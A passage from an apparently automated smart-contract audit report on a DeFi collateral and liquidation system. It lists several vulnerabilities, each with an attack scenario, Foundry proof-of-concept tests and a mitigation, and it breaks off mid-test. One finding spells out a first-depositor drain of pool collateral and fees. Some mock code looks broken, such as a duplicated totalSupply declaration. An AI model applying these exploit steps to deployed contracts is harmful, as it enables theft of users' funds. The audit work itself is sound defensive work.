Liquidation.startFullLiquidation sets _agent.liquidationStartedAt only if (_agent.status == FULL_LIQUIDATION || _agent.status == DESTROYING). ChallengesFacet._validateAgentStatus forbids both statuses, so on first entry from NORMAL/LIQUIDATION the guard is false and liquidationStartedAt remains 0. The function then unconditionally sets status to FULL_LIQUIDATION and emits FullLiquidationStarted. This breaks the timing invariant that premiums step from the start timestamp. Any logic that computes liquidation premium as f(block.timestamp - liquidationStartedAt) will see a huge delta (or treat 0 as genesis), jumping to the maximum premium immediately. This overpays liquidators from the agent vault and pool and desynchronizes state from the emitted event.

Vulnerable snippet (IR):
- Liquidation.startFullLiquidation: if (_agent.status == FULL_LIQUIDATION || _agent.status == DESTROYING) { if (_agent.liquidationStartedAt == 0) _agent.liquidationStartedAt = block.timestamp; } _agent.status = FULL_LIQUIDATION; emit FullLiquidationStarted(...)
- ChallengesFacet._liquidateAndRewardChallenger: _validateAgentStatus(agent) // forbids FULL_LIQUIDATION/DESTROYING; then Liquidation.startFullLiquidation(_agent)

Effect: status becomes FULL_LIQUIDATION but liquidationStartedAt stays 0, breaking step-based liquidation accounting.

## Impact
A challenger can force FULL_LIQUIDATION with liquidationStartedAt=0, causing liquidation premium to be computed at the maximum step instantly. Liquidators can immediately liquidate with elevated payouts, over-slashing agent vault collateral and the collateral pool relative to the intended step schedule. State is inconsistent with FullLiquidationStarted event and timing-based safety checks.

## Proof of Concept
1) Attacker observes/produces a valid challenge (illegalPaymentChallenge/doublePaymentChallenge/freeBalanceNegativeChallenge). 2) ChallengesFacet calls Liquidation.startFullLiquidation on an agent not yet in FULL_LIQUIDATION/DESTROYING. 3) Because of the guard, liquidationStartedAt remains 0 while status = FULL_LIQUIDATION. 4) Attacker (or any liquidator) immediately calls liquidate() and receives maximum-step premium, extracting more collateral than intended.

Note: The following unit test demonstrates the core state break (status set to FULL_LIQUIDATION while liquidationStartedAt remains 0), which is the root cause enabling premium mispricing.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Liquidation} from "contracts/assetManager/library/Liquidation.sol";
import {Agent} from "contracts/assetManager/library/data/Agent.sol";

contract StartFullLiquidationHarness {
    Agent.State internal agent;

    function setStatus(Agent.Status s) external { agent.status = s; }
    function setLiquidationStartedAt(uint64 ts) external { agent.liquidationStartedAt = ts; }
    function startFull() external { Liquidation.startFullLiquidation(agent); }
    function getStatus() external view returns (Agent.Status) { return agent.status; }
    function getTs() external view returns (uint64) { return agent.liquidationStartedAt; }
}

contract LiquidationStartTimeTest is Test {
    function test_StartFullLiquidation_LeavesStartTimeZero_OnFirstEntry() public {
        StartFullLiquidationHarness h = new StartFullLiquidationHarness();
        // Simulate initial non-destroying, non-full state allowed by _validateAgentStatus
        // LIQUIDATION is allowed (only FULL_LIQUIDATION/DESTROYING are forbidden by ChallengesFacet)
        h.setStatus(Agent.Status.LIQUIDATION);
        h.setLiquidationStartedAt(0);
        vm.warp(1_000_000);

        // Call the vulnerable path
        h.startFull();

        // Status is moved to FULL_LIQUIDATION
        assertEq(uint256(h.getStatus()), uint256(Agent.Status.FULL_LIQUIDATION), "status must be FULL_LIQUIDATION");
        // Bug: liquidationStartedAt remains 0 instead of current timestamp
        assertEq(uint256(h.getTs()), 0, "liquidationStartedAt incorrectly remains 0");
    }
}


## Suggested Mitigation
Update Liquidation.startFullLiquidation to always initialize the timestamp if zero, regardless of current status, and emit the event using the stored value for consistency:

function startFullLiquidation(Agent.State storage _agent) internal {
    if (_agent.liquidationStartedAt == 0) {
        _agent.liquidationStartedAt = uint64(block.timestamp);
    }
    _agent.status = Agent.Status.FULL_LIQUIDATION;
    emit IAssetManagerEvents.FullLiquidationStarted(Agent.vaultAddress(_agent), uint256(_agent.liquidationStartedAt));
}

This ensures the first transition to FULL_LIQUIDATION always records a start time and the event matches on-chain state.





 **Derived From** : Zero price => infinite CR; liquidation can be skipped/ended via price desync

## [M-30]. Zero-price path inflates CR to 1e10 and, via max(ratio,ratioTrusted), suppresses/ends liquidation

## Derived From Pattern/Invariant
Zero price => infinite CR; liquidation can be skipped/ended via price desync

## Exploit Type
Oracle

## Location
AgentCollateral.collateralRatioBIPS

## Minimim Privilege Required
Permissionless

## Description
AgentCollateral.collateralRatioBIPS returns a sentinel 1e10 when backingTokenWei == 0. If the price path used to compute amgToTokenWeiPrice resolves to 0 (oracle glitch/stale/invalid), convertAmgToTokenWei(..., 0) yields 0 and collateralRatioBIPS returns 1e10 (treated as very healthy). Liquidation.getCollateralRatioBIPS then does _collateralRatioBIPS = Math.max(ratio, ratioTrusted), so a single bad path with price==0 dominates even if the other path is sane. This feeds into LiquidationFacet._startLiquidation (underwater check) and Liquidation.endLiquidationIfHealthy, allowing liquidation to be skipped or prematurely ended.
Vulnerable snippets:
- AgentCollateral.collateralRatioBIPS:
  backingTokenWei = Conversion.convertAmgToTokenWei(totalAMG, _data.amgToTokenWeiPrice);
  if (backingTokenWei == 0) return 1e10; // huge CR
- Liquidation.getCollateralRatioBIPS:
  ratio = AgentCollateral.collateralRatioBIPS(_data, _agent);
  ratioTrusted = AgentCollateral.collateralRatioBIPS(_trustedData, _agent);
  _collateralRatioBIPS = Math.max(ratio, ratioTrusted);
This assumes prices are always > 0 and fresh; a zero/invalid path desynchronizes CR from reality and suppresses liquidation logic.

## Impact
Temporary DoS of liquidations: anyone can call endLiquidation() during a zero-price glitch to flip an undercollateralized agent back to NORMAL. While the glitch lasts, liquidation cannot start and may be ended prematurely, letting the agent avoid slashing and potentially withdraw more collateral if other checks reuse the same inflated CR.

## Proof of Concept
1) An agent is in or near liquidation; true CR < minCR.
2) Oracle/trusted path briefly publishes 0 for a symbol used to derive amgToTokenWeiPrice (e.g., FTSO outage or decimals error). Then AgentCollateral.collateralRatioBIPS(..., price=0) returns 1e10.
3) Because Liquidation.getCollateralRatioBIPS uses Math.max(ratio, ratioTrusted), the inflated 1e10 dominates, yielding a seemingly healthy CR.
4) Any EOA calls LiquidationFacet.endLiquidation(agentVault). endLiquidationIfHealthy sees CR >= target and sets status NORMAL, emitting LiquidationEnded.
5) While the price glitch persists, liquidation cannot be started (underwater checks fail). If other flows reuse the same CR, the agent can pass CR gates and maneuver collateral. When prices recover, the agent has avoided liquidation pressure during the window.

## Proof of Code
pragma solidity ^0.8.27; import "forge-std/Test.sol"; import {Agent} from "contracts/assetManager/library/data/Agent.sol"; import {AgentCollateral} from "contracts/assetManager/library/AgentCollateral.sol"; import {Collateral} from "contracts/assetManager/library/data/Collateral.sol"; import {Math} from "@openzeppelin/contracts/utils/math/Math.sol"; contract ReserveOrPriceDesyncTest is Test {    function testZeroPriceInflatesCRAndMasksUnderwater() public {        // Create an agent storage slot and simulate non-zero minted so CR should be finite        Agent.State storage a = Agent.getWithoutCheck(address(this));        a.mintedAMG = 100; // any non-zero        // Simulate oracle glitch: price path resolves to zero        Collateral.Data memory d = Collateral.Data({            kind: Collateral.Kind.VAULT,            fullCollateral: 1e18,            amgToTokenWeiPrice: 0        });        // Vulnerable behavior: zero price => huge sentinel CR        uint256 cr = AgentCollateral.collateralRatioBIPS(d, a);        assertEq(cr, 10_000_000_000, "zero price must not yield healthy CR");        // Even if the trusted path is sane, max() will pick the inflated value        uint256 trustedCR = 12_000; // 120%        uint256 combined = Math.max(cr, trustedCR);        assertEq(combined, cr, "max(ratio,ratioTrusted) masks the good path");        // Underwater check suppressed: combined >= minCR although true CR is bad        uint256 minCR = 15_000; // 150%        bool underwater = combined < minCR;        assertEq(underwater, false, "liquidation incorrectly suppressed");    } }

## Suggested Mitigation
Never return a healthy sentinel for zero/invalid prices. In AgentCollateral.collateralRatioBIPS, treat backingTokenWei == 0 as unusable (revert or return 0 and mark invalid). In Liquidation.getCollateralRatioBIPS, ignore zero/invalid paths and require both ratio and ratioTrusted to be >0 and fresh; if one is invalid, use the other; if both invalid, revert. For safety-critical checks (start/end liquidation), require both vaultCR and poolCR from valid, fresh feeds to satisfy thresholds, e.g., use the minimum of ratio and ratioTrusted or require both to pass, never Math.max. Add explicit staleness/zero guards at call sites and enforce max price age.





 **Derived From** : Whitelist check uses msg.sender instead of parameter, bypassing auth

## [M-31]. AgentOwnerRegistry.isWhitelisted uses msg.sender instead of _address, breaking agent onboarding gate

## Derived From Pattern/Invariant
Whitelist check uses msg.sender instead of parameter, bypassing auth

## Exploit Type
AuthByPass

## Location
AgentOwnerRegistry.isWhitelisted

## Minimim Privilege Required
Permissionless

## Description
AgentOwnerRegistry.isWhitelisted(address) returns whitelist[msg.sender] instead of whitelist[_address]. When AssetManager calls Agents.requireWhitelisted(ownerManagementAddress) -> AgentOwnerRegistry.isWhitelisted(ownerManagementAddress), msg.sender is the AssetManager, not the ownerManagementAddress. This decouples the check from the intended subject and causes: (a) DoS of createAgentVault for legitimate whitelisted owners if AssetManager is not whitelisted, and (b) global bypass if AssetManager is (mis)whitelisted. Vulnerable snippet: function isWhitelisted(address _address) public view returns (bool) { return whitelist[msg.sender]; }

## Impact
All agent onboarding via createAgentVault is effectively blocked because Agents.requireWhitelisted(ownerManagementAddress) calls AgentOwnerRegistry.isWhitelisted(ownerManagementAddress) but the registry reads whitelist[msg.sender] (the AssetManager), not the provided address. Since AssetManager is not intended to be whitelisted, legitimate whitelisted owners cannot create agents (systemic DoS). If governance mistakenly whitelists the AssetManager address, the whitelist gate is globally bypassed and any address can create agents. No immediate fund loss occurs, but core functionality and authorization are broken until a fix is deployed.

## Proof of Concept
1) DoS path: Any EOA calls AssetManager.createAgentVault with a valid proof and a management address that governance whitelisted. Agents.requireWhitelisted calls registry.isWhitelisted(mgmt), which returns registry.whitelist[AssetManager] (likely false). The require reverts with AgentNotWhitelisted(), blocking all onboarding. 2) Bypass path: If AssetManager gets whitelisted (even accidentally), any EOA can call createAgentVault and pass an unwhitelisted management address; the check reads whitelist[AssetManager]==true and passes, enabling unauthorized agent creation.

## Proof of Code
pragma solidity ^0.8.27;
import "forge-std/Test.sol";

contract BuggyAgentOwnerRegistry {
    mapping(address=>bool) public whitelist;
    function setWhitelist(address a, bool v) external { whitelist[a]=v; }
    // BUG: ignores parameter, uses msg.sender instead
    function isWhitelisted(address _address) public view returns (bool) {
        return whitelist[msg.sender];
    }
}

contract AssetManagerShim {
    BuggyAgentOwnerRegistry public registry;
    constructor(BuggyAgentOwnerRegistry r){ registry = r; }
    function createAgent(address ownerManagementAddress) external returns (bool){
        require(registry.isWhitelisted(ownerManagementAddress), "AgentNotWhitelisted()");
        return true;
    }
}

contract AgentOwnerWhitelistBugTest is Test {
    BuggyAgentOwnerRegistry reg;
    AssetManagerShim am;
    address mgmt = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        reg = new BuggyAgentOwnerRegistry();
        am = new AssetManagerShim(reg);
        // default: mgmt not whitelisted, AM not whitelisted
        reg.setWhitelist(mgmt, false);
        reg.setWhitelist(address(am), false);
    }

    // DoS: even though mgmt is whitelisted, check reads AM's whitelist (false) -> revert
    function test_CreateAgentRevertsDespiteWhitelistedMgmt() public {
        reg.setWhitelist(mgmt, true);            // legit mgmt is whitelisted
        reg.setWhitelist(address(am), false);    // AM not whitelisted (normal config)
        vm.startPrank(attacker);
        vm.expectRevert(bytes("AgentNotWhitelisted()"));
        am.createAgent(mgmt);
        vm.stopPrank();
    }

    // Bypass: AM whitelisted -> any mgmt (even unwhitelisted) passes
    function test_AnyoneCanCreateAgentIfAssetManagerWhitelisted() public {
        // mgmt intentionally left unwhitelisted (false from setUp)
        reg.setWhitelist(address(am), true);     // misconfiguration
        vm.startPrank(attacker);
        bool ok = am.createAgent(mgmt);
        assertTrue(ok);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Fix AgentOwnerRegistry.isWhitelisted to return whitelist[_address] (the parameter) instead of whitelist[msg.sender]. Add unit tests that call isWhitelisted via both EOA and a contract (simulating AssetManager) to ensure the subject of the check is the provided address. Optionally, add a governance sanity check to prevent accidentally whitelisting the AssetManager address (e.g., reject known system addresses in whitelist operations) and include a regression test for this case.





 **Derived From** : totalCollateral == old(totalCollateral) + msg.value

## [H-32]. First-entrant share inflation in CollateralPool.enter drains pre-existing pool fees and collateral

## Derived From Pattern/Invariant
totalCollateral == old(totalCollateral) + msg.value

## Exploit Type
AccountingInvariantViolation

## Location
CollateralPool.enter

## Minimim Privilege Required
Permissionless

## Description
When token.totalSupply() == 0, enter() mints tokenShare = msg.value and adds msg.value to totalCollateral via _depositWNat. If the pool already holds assets (totalCollateral > 0 and/or totalFAssetFees > 0), the first entrant receives 100% of the supply for only msg.value, but their redemption share is computed on the full pool (old totalCollateral + msg.value) and they can also withdraw all pre-existing FAsset fees. The only safeguards are require(msg.value >= totalCollateral) and require(msg.value >= value(totalFAssetFees)), but the attacker recoups msg.value on exit and keeps the entire prior collateral C and all prior fees F. Vulnerable snippet: tokenShare = _collateralToTokenShare(msg.value) → if totalSupply==0 returns msg.value; then _depositWNat(); then token.mint(attacker, msg.value). No adjustment is made for pre-existing totalCollateral/fees.

## Impact
When pool token totalSupply is zero but the pool already holds collateral and/or fees, the first entrant can mint all supply at par for their deposit, immediately withdraw 100% of existing FAsset fees (no debt assigned on first enter), and, after the token timelock, exit with all NAT in the pool. They must deposit at least max(pre-existing NAT collateral value, pre-existing fee value in NAT), but they recover the deposit on exit and capture all pre-existing NAT collateral as pure profit, plus all legacy FAsset fees. This is a permissionless direct drain of pool collateral and fee theft.

## Proof of Concept
Assume the pool has token.totalSupply() == 0, but holds: totalCollateral = C NAT (e.g., via prior depositNat by AssetManager) and totalFAssetFees = F (from prior system mints). An attacker does:
1) Call enter with D = max(C, value_NAT(F)) (the function enforces both inequalities). Because totalSupply==0, tokenShare = D and feeDebt = 0 (first-entrance branch), so the attacker owns 100% of tokens and has no fee debt.
2) Immediately withdraw all fees: withdrawFees(F). Since they own 100% of tokens and have zero fee debt, freeFAssetFeeShare equals totalFAssetFees, so they can take all F.
3) After the timelock expires, exitTo(D, attacker). Pro-rata NAT received is natShare = totalCollateral * D / totalSupply = (C + D) (they own 100%).
Net effect: The attacker’s per-tx exit transfer is C + D; accounting for the initial deposit D, their net NAT profit is C (the pre-existing collateral), and they also keep F in FAssets. This drains all pre-existing pool NAT and fees.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {CollateralPool} from "contracts/collateralPool/implementation/CollateralPool.sol";
import {CollateralPoolToken} from "contracts/collateralPool/implementation/CollateralPoolToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IWNat {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

contract WNatMock is IWNat {
    string public name = "MockWNat";
    string public symbol = "mWFLR";
    uint8 public decimals = 18;
    mapping(address => uint256) public override balanceOf;
    uint256 public totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
    function deposit() external payable override {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
        emit Transfer(address(0), msg.sender, msg.value);
    }
    function withdraw(uint256 wad) external override {
        require(balanceOf[msg.sender] >= wad, "bal");
        balanceOf[msg.sender] -= wad;
        totalSupply -= wad;
        (bool ok,) = payable(msg.sender).call{value: wad}("");
        require(ok, "eth");
        emit Transfer(msg.sender, address(0), wad);
    }
}

contract MockFAsset is IERC20 {
    string public name = "MockF"; string public symbol = "MF"; uint8 public decimals = 18;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    uint256 public override totalSupply;
    function totalSupply() external view override returns (uint256) { return totalSupply; }
    function transfer(address to, uint256 v) external override returns (bool){ require(balanceOf[msg.sender]>=v, "bal"); balanceOf[msg.sender]-=v; balanceOf[to]+=v; return true; }
    function approve(address s, uint256 v) external override returns (bool){ allowance[msg.sender][s]=v; return true; }
    function transferFrom(address f,address t,uint256 v) external override returns(bool){ require(balanceOf[f]>=v && allowance[f][msg.sender]>=v, "allow"); allowance[f][msg.sender]-=v; balanceOf[f]-=v; balanceOf[t]+=v; return true; }
    function mint(address to, uint256 v) external { balanceOf[to]+=v; totalSupply+=v; }
}

contract CollateralPool_FirstEnter_ShareInflation_FoundryTest is Test {
    CollateralPool pool;
    CollateralPoolToken token;
    WNatMock wnat;
    MockFAsset fasset;

    address agentVault = address(0xA11);
    address attacker = address(0xBEEF);

    // AssetManager hooks used by pool/token
    function assetPriceNatWei() external pure returns (uint256 mul, uint256 div) { return (1, 1); }
    function updateCollateral(address /*_agentVault*/, IERC20 /*_token*/) external { }
    function getCollateralPoolTokenTimelockSeconds() external pure returns (uint256) { return 60; }
    function getFAssetsBackedByPool(address /*_agentVault*/) external pure returns (uint256) { return 0; }

    function setUp() external {
        vm.txGasPrice(0);
        wnat = new WNatMock();
        fasset = new MockFAsset();
        pool = new CollateralPool(agentVault, address(this), address(fasset), 16000);
        pool.upgradeWNatContract(IWNat(address(wnat)));
        token = new CollateralPoolToken(address(pool), "FCPT-SYS-AG", "FCPT-SYS-AG");
        pool.setPoolToken(address(token));

        // Prefund pool while CPT supply == 0
        uint256 F = 1_000 ether; // pre-existing FAsset fees
        fasset.mint(address(pool), F);
        vm.prank(address(this)); pool.fAssetFeeDeposited(F);

        uint256 C = 1 ether; // pre-existing NAT collateral
        vm.deal(address(this), C);
        vm.prank(address(this)); pool.depositNat{value: C}();

        vm.deal(attacker, 2_000 ether);
        // Invariants before attack
        assertEq(token.totalSupply(), 0, "unexpected initial CPT supply");
        assertEq(wnat.balanceOf(address(pool)), C, "unexpected initial NAT in pool");
    }

    function test_firstEnterDrainsPreexistingFeesAndCollateral() external {
        uint256 F = 1_000 ether;
        uint256 C = 1 ether;
        uint256 D = 1_000 ether; // >= max(C, F at 1:1)

        uint256 attackerStart = attacker.balance; // 2_000 ether

        vm.startPrank(attacker);
        (uint256 minted,) = pool.enter{value: D}();
        assertEq(minted, D, "first mint should equal deposit when supply==0");
        assertEq(token.totalSupply(), D);
        assertEq(token.balanceOf(attacker), D);
        assertEq(attacker.balance, attackerStart - D, "deposit deducted");

        // Steal all pre-existing fees immediately
        pool.withdrawFees(F);
        assertEq(fasset.balanceOf(attacker), F, "all pre-existing fees withdrawn");

        // Wait timelock then fully exit
        vm.warp(block.timestamp + 61);
        uint256 balBeforeExit = attacker.balance;
        uint256 natReceived = pool.exitTo(D, payable(attacker));
        vm.stopPrank();

        // Per-transaction exit transfer equals all pool NAT (C + D)
        assertEq(natReceived, C + D, "exit should transfer full NAT");
        assertEq(attacker.balance, balBeforeExit + natReceived, "exit paid to attacker");

        // Net accounting: deposit D, then receive D + C -> net profit C in NAT
        assertEq(attacker.balance, attackerStart + C, "net NAT profit equals prior NAT C");
        assertEq(fasset.balanceOf(attacker), F, "attacker keeps all pre-existing FAsset fees");

        // Pool drained
        assertEq(wnat.balanceOf(address(pool)), 0, "pool NAT drained");
        assertEq(token.totalSupply(), 0, "all CPT burned");
    }
}


## Suggested Mitigation
Harden the first-entry case so that pre-existing value cannot be captured at par by the first depositor:
- Simple and safe: In enter(), if token.totalSupply() == 0 then require(totalCollateral == 0 && totalFAssetFees == 0), otherwise revert. Also disallow fee withdrawals while totalSupply == 0 (e.g., make _fAssetFeesOf return 0 or add a require in withdrawFees/To) to avoid sweeping fees before a fair initial pricing event.
- Alternatively (more complex): If totalSupply == 0 and there are pre-existing assets, assign feeDebt equal to totalVirtualFees() to the entrant and scale initial tokenShare so that post-mint price reflects the full NAV (totalCollateral + msg.value valued in NAT, plus fees at current price) per token. This requires defining an explicit initial price and minting policy; the simplest is to forbid entry until pre-existing assets are zeroed or explicitly swept by the AssetManager.





 **Derived From** : Emergency pause bypass in executeMinting allows minting while paused

## [M-33]. executeMinting lacks pause/attachment gating, allowing mint finalization during emergency pause

## Derived From Pattern/Invariant
Emergency pause bypass in executeMinting allows minting while paused

## Exploit Type
AuthByPass

## Location
MintingFacet.executeMinting

## Minimim Privilege Required
Permissionless

## Description
MintingFacet.executeMinting is a sensitive entrypoint: it mints FAssets to the minter, mints pool fees, updates underlying balance and releases the agent’s reserved collateral. Unlike self-minting paths, it has no system gating (no onlyAttached, no notEmergencyPaused, no state.mintingPausedAt check). This lets minters/executors/agent owners finalize pending CRTs while the system is emergency-paused or minting is paused, defeating the pause control.
Vulnerable snippet:
function executeMinting(IPayment.Proof calldata _payment, uint256 _crtId) external nonReentrant { ... } // no onlyAttached / notEmergencyPaused / state.mintingPausedAt check
In contrast:
function selfMint(...) external onlyAttached notEmergencyPaused { require(state.mintingPausedAt == 0, MintingPaused()); ... }
function mintFromFreeUnderlying(...) external onlyAttached notEmergencyPaused { require(state.mintingPausedAt == 0, MintingPaused()); ... }

## Impact
During emergency pause or when minting is paused, authorized callers (the CRT’s minter, the designated executor, or the agent owner) can still finalize minting via executeMinting. This undermines pause guarantees by allowing circulation/supply changes, releasing reserved collateral, and minting pool fees when operations are expected to be halted. While this does not enable arbitrary outsiders to mint or drain, it can distort accounting and system state until governance intervention, and defeats the intended effect of global/minting pause.

## Proof of Concept
1) A user creates a collateral reservation (CRT) before any pause, specifying themselves as minter (or setting an executor they control).
2) Governance triggers emergency pause or pauses minting.
3) The user obtains a valid FDC payment proof for the CRT payment they made on the underlying chain.
4) The user (as minter/executor) calls executeMinting(_payment, crtId).
5) Because executeMinting lacks onlyAttached, notEmergencyPaused, and no check for state.mintingPausedAt, the call still succeeds during pause: FAssets are minted to the minter, pool fees are minted, agent underlying balance is updated, and the agent’s reserved collateral is released.
6) The caller repeats for all their pending CRTs, changing circulating supply and balances despite the pause.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";

contract MintingFacetHarness {
    bool public emergency;
    uint64 public mintingPausedAt;
    uint256 public minted;
    struct CRT { address minter; address executor; bool active; }
    mapping(uint256=>CRT) public crts;

    function reserve(uint256 id, address minter, address executor) external {
        crts[id] = CRT(minter, executor, true);
    }
    function emergencyPauseOn() external { emergency = true; }
    function emergencyPauseOff() external { emergency = false; }
    function pauseMinting() external { mintingPausedAt = 1; }
    function unpauseMinting() external { mintingPausedAt = 0; }

    modifier notEmergencyPaused() {
        require(!emergency, "paused");
        _;
    }

    // Correctly gated self-mint path for comparison
    function selfMint(uint256 /*lots*/) external notEmergencyPaused {
        require(mintingPausedAt == 0, "MintingPaused");
        minted += 1;
    }

    // Vulnerable: missing notEmergencyPaused and mintingPausedAt gate
    function executeMinting(uint256 crtId) external {
        CRT storage c = crts[crtId];
        require(c.active, "inactive");
        require(msg.sender == c.minter || msg.sender == c.executor, "only minter/executor");
        minted += 1;
        c.active = false;
    }
}

contract MintingPauseBypassTest is Test {
    MintingFacetHarness m;
    address attacker = address(0xA11CE);

    function setUp() public {
        m = new MintingFacetHarness();
        m.reserve(1, attacker, address(0));
        m.pauseMinting();
        m.emergencyPauseOn();
    }

    function test_executeMinting_bypasses_pause() public {
        // selfMint is correctly gated and reverts while paused
        vm.prank(attacker);
        vm.expectRevert(); // "paused" or "MintingPaused"
        m.selfMint(1);

        // But executeMinting (like in prod) is missing the same gates and succeeds
        vm.prank(attacker);
        m.executeMinting(1);

        assertEq(m.minted(), 1, "minted increased while paused");
        (address minter, address executor, bool active) = m.crts(1);
        assertEq(active, false, "crt closed while paused");
        assertEq(minter, attacker);
        assertEq(executor, address(0));
    }
}

## Suggested Mitigation
Gate executeMinting consistently with other mint paths: add onlyAttached and notEmergencyPaused modifiers and require(AssetManagerState.get().mintingPausedAt == 0). For example: function executeMinting(...) external onlyAttached notEmergencyPaused { require(AssetManagerState.get().mintingPausedAt == 0, MintingPaused()); ... } This aligns behavior with selfMint and mintFromFreeUnderlying and ensures both global emergency pause and minting pause are enforced.





 **Derived From** : Executor can brick mint finalization by reverting on native payout

## [L-34]. MintingFacet.executeMinting can be bricked by a reverting executor fallback (griefable native payout DoS)

## Derived From Pattern/Invariant
Executor can brick mint finalization by reverting on native payout

## Exploit Type
Dos

## Location
MintingFacet.executeMinting

## Minimim Privilege Required
Permissionless

## Description
reserveCollateral records a user-supplied executor and fee in the CRT. During executeMinting, after proofs and state updates, the facet pays the executor in native FLR. The payout is done with a native transfer (e.g., Transfers.safeTransferNative), which will bubble up any revert from the executor’s payable fallback/receive. If the executor address is a contract that reverts on receive, the native transfer reverts and the whole executeMinting reverts, repeatedly bricking mint finalization for that CRT and keeping the agent’s collateral reservation locked until fallback flows (default/unstick) are used. There is no try/catch, bypass, or claim path on payout failure. Vulnerable sketch:

// state updated (proof verified, CRT finalized)
Transfers.safeTransferNative(crt.executor, crt.executorFee);
// if executor fallback reverts, entire executeMinting reverts and mint stays stuck

## Impact
Functional DoS of mint finalization for the affected CRT; minter cannot receive FAssets and the agent’s reserved collateral stays locked until agent-only fallback flows are executed. Attackers can repeatedly grief agents by creating CRTs with reverting executors (at CRF cost), degrading liveness.

## Proof of Concept
1) Attacker (as minter) calls reserveCollateral with _executor set to a contract whose receive/fallback reverts; supplies a non-zero executor fee in msg.value so the CRT stores a payout amount.
2) The minter (or anyone) later calls executeMinting with a valid payment proof.
3) executeMinting progresses to the executor payout step and tries Transfers.safeTransferNative(crt.executor, crt.executorFee).
4) The executor’s fallback reverts, causing executeMinting to revert. Any subsequent attempt to finalize the same CRT will keep reverting.
5) The minter never receives FAssets; the agent’s collateral reservation remains locked until the agent performs mintingPaymentDefault/unstickMinting after timeouts, creating a liveness and capital lockup DoS.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Transfers} from "contracts/utils/library/Transfers.sol";

contract RevertingExecutor {
    receive() external payable { revert("revert-on-receive"); }
    fallback() external payable { revert("revert-on-receive"); }
}

contract PayoutHarness {
    // Mirrors the vulnerable native payout used at the end of executeMinting
    function pay(address payable to, uint256 amount) external payable {
        require(address(this).balance >= amount, "insufficient");
        Transfers.safeTransferNative(to, amount);
    }
}

contract GriefableMintingExecuteTest is Test {
    PayoutHarness internal h;
    RevertingExecutor internal exec;

    function setUp() public {
        h = new PayoutHarness();
        exec = new RevertingExecutor();
        vm.deal(address(h), 1 ether);
    }

    function test_ExecutorFallbackRevert_BricksPayout() public {
        assertEq(address(h).balance, 1 ether);
        vm.expectRevert();
        h.pay(payable(address(exec)), 0.2 ether);
        // Native payout reverts -> core flow (analogous to executeMinting) reverts
        assertEq(address(h).balance, 1 ether);
    }
}


## Suggested Mitigation
Do not hard-require the native executor payout to succeed. Use a low-level call and proceed even if it fails, recording the unpaid amount for pull-based claiming. Example approach: (1) attempt (bool ok,) = executor.call{value: fee}(""); (2) if !ok, store fee in a mapping claimableExecutorFees[crtId] and emit ExecutorPayoutPending(crtId, executor, fee); (3) add claimExecutorFee(crtId) allowing the executor (or minter to change executor to an EOA and claim) to pull funds later; (4) do not revert executeMinting on payout failure. Alternatively, restrict executor to EOAs (not recommended alone) or allow a single retry/bypass path that re-routes payout to minter if executor receive reverts.





 **Derived From** : Anyone can set redemptionPaymentExtensionSeconds via facet init

## [M-35]. Permissionless initializer in RedemptionTimeExtensionFacet lets first caller set global redemptionPaymentExtensionSeconds causing system-wide redemption timing DoS

## Derived From Pattern/Invariant
Anyone can set redemptionPaymentExtensionSeconds via facet init

## Exploit Type
UpgradeabilityInitializerSafety

## Location
RedemptionTimeExtensionFacet.initRedemptionTimeExtensionFacet(uint256)

## Minimim Privilege Required
Permissionless

## Description
RedemptionTimeExtensionFacet exposes a one-time initializer without governance gating. The first external caller can set the global RedemptionTimeExtension.redemptionPaymentExtensionSeconds to any value, including 0 or extremely large numbers. This immediately skews all redemption payment windows: too small values force premature defaults against agents; too large values delay default/confirmation, effectively freezing redeemers while their FAssets are already burned. Governance cannot instantly repair because subsequent updates are bounded/time‑gated by SettingsUpdater, prolonging disruption. Vulnerable code shape (as documented):

function initRedemptionTimeExtensionFacet(uint256 _secs) external {
    require(!state.initialized, "AlreadyInitialized");
    // no onlyGovernance
    _registerInterfaces();
    RedemptionTimeExtension.redemptionPaymentExtensionSeconds = _secs;  // attacker-chosen
    state.initialized = true;
}

## Impact
If the facet is added to the AssetManager diamond with initRedemptionTimeExtensionFacet still uncalled, any external address can call it once and set RedemptionTimeExtension.redemptionPaymentExtensionSeconds to an attacker-chosen value. Setting it to an extremely large value materially delays redemption finalization and third-party confirmations across the system; setting it to zero shrinks windows and pushes agents toward premature defaults. Since subsequent governance updates are rate-limited and bounded by SettingsUpdater, restoring a sane value can require multiple update intervals, causing a repeatable, system-wide timing DoS until corrected. No direct theft occurs, but core redemption flows are degraded.

## Proof of Concept
Preconditions
- An AssetManager diamond is deployed and initialized (via DiamondInit.init), and a diamond cut has added RedemptionTimeExtensionFacet’s selectors to the routing table, but initRedemptionTimeExtensionFacet has not yet been called.

Steps
1) Attacker calls AssetManagerDiamond.initRedemptionTimeExtensionFacet(365 days) through the diamond (cast to the facet ABI), which is currently ungated.
2) The call succeeds and sets RedemptionTimeExtension.redemptionPaymentExtensionSeconds = 365 days globally.
3) Verify via AssetManagerDiamond.redemptionPaymentExtensionSeconds() that the value reflects the attacker’s choice.
4) Any subsequent governance attempt to bring the value back is rate-limited/bounded, prolonging the degraded state.

Variant: Call with 0 to force near-zero extension and accelerate defaults.

## Proof of Code
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {AssetManager} from "contracts/assetManager/implementation/AssetManager.sol";
import {DiamondInit} from "contracts/diamond/mock/DiamondInit.sol";
import {IDiamondCut} from "contracts/diamond/interfaces/IDiamondCut.sol";
import {RedemptionTimeExtensionFacet} from "contracts/assetManager/facets/RedemptionTimeExtensionFacet.sol";

interface IRedemptionTimeExtensionView {
    function redemptionPaymentExtensionSeconds() external view returns (uint256);
}

contract RedemptionTimeExtensionInitPocTest is Test {
    address attacker = address(0xBEEF);
    AssetManager diamond;
    RedemptionTimeExtensionFacet facetImpl;

    function setUp() public {
